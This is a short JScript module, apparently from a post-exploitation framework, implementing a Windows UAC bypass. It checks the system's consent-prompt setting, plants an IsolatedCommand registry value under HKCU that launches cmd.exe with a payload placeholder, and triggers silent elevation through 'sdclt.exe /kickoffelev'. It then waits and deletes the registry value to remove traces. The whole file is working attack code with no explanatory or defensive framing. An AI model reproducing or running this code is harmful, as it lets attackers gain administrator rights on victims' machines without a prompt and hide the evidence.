try
{
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = proton.registry.read(proton.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", proton.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }
    var path = "Software\\Classes\\exefile\\shell\\runas\\command";

    var cmd = proton.file.getPath("%COMSPEC%");
    proton.registry.write(proton.registry.HKCU, path, "IsolatedCommand", cmd + " /c ~PAYLOAD_DATA~", proton.registry.STRING);

    proton.shell.run("sdclt.exe /kickoffelev", true);

    proton.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (proton.registry.destroy(proton.registry.HKCU, path, "IsolatedCommand") != 0)
    {
        proton.shell.run("reg delete HKCU\\"+path+" /v IsolatedCommand /f", true);
    }
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
